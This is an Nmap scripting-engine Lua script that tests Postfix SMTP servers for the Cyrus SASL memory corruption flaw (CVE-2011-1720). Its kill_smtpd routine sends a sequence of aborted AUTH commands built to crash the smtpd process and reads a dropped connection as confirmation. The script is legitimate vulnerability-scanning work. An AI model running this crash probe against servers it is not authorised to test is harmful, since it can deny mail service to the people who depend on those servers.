local shortport = require "shortport"
local smtp = require "smtp"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Checks for a memory corruption in the Postfix SMTP server when it uses
Cyrus SASL library authentication mechanisms (CVE-2011-1720).  This
vulnerability can allow denial of service and possibly remote code
execution.

Reference:
* http://www.postfix.org/CVE-2011-1720.html
]]

---
-- @usage
-- nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 <host>
--
-- @output
-- PORT   STATE SERVICE
-- 25/tcp open  smtp
-- | smtp-vuln-cve2011-1720:
-- |   VULNERABLE:
-- |   Postfix SMTP server Cyrus SASL Memory Corruption
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2011-1720  OSVDB:72259
-- |     Description:
-- |       The Postfix SMTP server is vulnerable to a memory corruption vulnerability
-- |       when the Cyrus SASL library is used with authentication mechanisms other
-- |       than PLAIN and LOGIN.
-- |     Disclosure date: 2011-05-08
-- |     Check results:
-- |       AUTH tests: CRAM-MD5 NTLM
-- |     Extra information:
-- |       Available AUTH MECHANISMS:  CRAM-MD5 DIGEST-MD5 NTLM PLAIN LOGIN
-- |     References:
-- |       http://www.postfix.org/CVE-2011-1720.html
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1720
-- |_      http://osvdb.org/72259
--
-- @args smtp.domain Define the domain to be used in the SMTP EHLO command.

author = "Djalal Harouni"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}


portrule = shortport.port_or_service({25, 465, 587},
  {"smtp", "smtps", "submission"})

local AUTH_VULN = {
  -- AUTH MECHANISM
  --    killby: a table of mechanisms that can corrupt and
  --          overwrite the AUTH MECHANISM data structure.
  --          probe: max number of probes for each test
  ["CRAM-MD5"]    = {
    killby = {["DIGEST-MD5"] = {probe = 1}}
  },
  ["DIGEST-MD5"]  = {
    killby = {}
  },
  ["EXTERNAL"]    = {
    killby = {}
  },
  ["GSSAPI"]      = {
    killby = {}
  },
  ["KERBEROS_V4"] = {
    killby = {}
  },
  ["NTLM"]        = {
    killby = {["DIGEST-MD5"] = {probe = 2}}
  },
  ["OTP"]         = {
    killby = {}
  },
  ["PASSDSS-3DES-1"] = {
    killby = {}
  },
  ["SRP"]         = {
    killby = {}
  },
}

-- parse and check the authentication mechanisms.
-- This function will save the vulnerable auth mechanisms in
-- the auth_mlist table, and returns all the available auth
-- mechanisms as a string.
local function chk_auth_mechanisms(ehlo_res, auth_mlist)
  local mlist = smtp.get_auth_mech(ehlo_res)

  if mlist then
    for _, mech in ipairs(mlist) do
      if AUTH_VULN[mech] then
        auth_mlist[mech] = mech
      end
    end
    return table.concat(mlist, " ")
  end
  return ""
end

-- Close any remaining connection
local function smtp_finish(socket, status, err)
  if socket then
    smtp.quit(socket)
  end
  return status, err
end

-- Tries to kill the smtpd server
-- Returns true, true if the smtpd was killed
local function kill_smtpd(socket, mech, mkill)
  local killed, ret = false
  local status, response = smtp.query(socket, "AUTH",
    string.format("%s", mech))
  if not status then
    return status, response
  end

  status, ret = smtp.check_reply("AUTH", response)
  if not status then
    return smtp_finish(socket, status, ret)
  end

  -- abort authentication
  smtp.query(socket, "*")

  status, response = smtp.query(socket, "AUTH",
    string.format("%s", mkill))
  if status then
    -- abort the last AUTH command.
    status, response = smtp.query(socket, "*")
  end

  if not status then
    if string.match(response, "connection closed") then
      killed = true
    else
      return status, response
    end
  end

  return true, killed
end

-- Checks if the SMTP server is vulnerable to CVE-2011-1720
-- Postfix Cyrus SASL authentication memory corruption
-- http://www.postfix.org/CVE-2011-1720.html
local function check_smtpd(smtp_opts)
  local socket, ret = smtp.connect(smtp_opts.host,
    smtp_opts.port,
    {ssl = false,
      recv_before = true,
    lines = 1})

  if not socket then
    return socket, ret
  end

  local status, response = smtp.ehlo(socket, smtp_opts.domain)
  if not status then
    return status, response
  end

  local starttls = false
  local auth_mech_list, auth_mech_str = {}, ""

  -- parse server response
  for _, line in pairs(stdnse.strsplit("\r?\n", response)) do
    if not next(auth_mech_list) then
      auth_mech_str = chk_auth_mechanisms(line, auth_mech_list)
    end

    if not starttls then
      starttls = line:match("STARTTLS")
    end
  end

  -- fallback to STARTTLS to get the auth mechanisms
  if not next(auth_mech_list) and smtp_opts.port.number ~= 25 and
    starttls then

    status, response = smtp.starttls(socket)
    if not status then
      return status, response
    end

    status, response = smtp.ehlo(socket, smtp_opts.domain)
    if not status then
      return status, response
    end

    for _, line in pairs(stdnse.strsplit("\r?\n", response)) do
      if not next(auth_mech_list) then
        auth_mech_str = chk_auth_mechanisms(line, auth_mech_list)
      end
    end
  end

  local vuln = smtp_opts.vuln
  vuln.check_results = {}
  if (#auth_mech_str > 0) then
    vuln.extra_info = {}
    table.insert(vuln.extra_info,
      string.format("Available AUTH MECHANISMS: %s", auth_mech_str))

    -- maybe vulnerable
    if next(auth_mech_list) then
      local auth_tests = {}

      for mech in pairs(auth_mech_list) do
        for mkill in pairs(AUTH_VULN[mech].killby) do

          if auth_mech_list[mkill] then
            auth_tests[#auth_tests+1] = mech

            local probe = AUTH_VULN[mech].killby[mkill].probe

            for p = 1, probe do
              status, ret = kill_smtpd(socket, mech, mkill)
              if not status then
                return smtp_finish(nil, status, ret)
              end

              if ret then
                vuln.state = vulns.STATE.VULN
                table.insert(vuln.check_results,
                  string.format("AUTH tests: %s", table.concat(auth_tests, " ")))
                table.insert(vuln.check_results,
                  string.format("VULNERABLE (%s => %s)", mech, mkill))
                return smtp_finish(nil, true)
              end

            end

          end

        end
      end

      table.insert(vuln.check_results, string.format("AUTH tests: %s",
        table.concat(auth_tests, " ")))
    end
  else
    stdnse.debug2("Authentication is not available")
    table.insert(vuln.check_results, "Authentication is not available")
  end

  vuln.state = vulns.STATE.NOT_VULN
  return smtp_finish(socket, true)
end

action = function(host, port)
  local smtp_opts = {
    host = host,
    port = port,
    domain = stdnse.get_script_args('smtp-vuln-cve2011-1720.domain') or
    smtp.get_domain(host),
    vuln = {
      title = 'Postfix SMTP server Cyrus SASL Memory Corruption',
      IDS = {CVE = 'CVE-2011-1720', OSVDB = '72259'},
      description = [[
The Postfix SMTP server is vulnerable to a memory corruption vulnerability
when the Cyrus SASL library is used with authentication mechanisms other
than PLAIN and LOGIN.]],
      references = {
        'http://www.postfix.org/CVE-2011-1720.html',
      },
      dates = {
        disclosure = {year = '2011', month = '05', day = '08'},
      },
    },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local status, err = check_smtpd(smtp_opts)
  if not status then
    stdnse.debug1("%s", err)
    return nil
  end
  return report:make_output(smtp_opts.vuln)
end
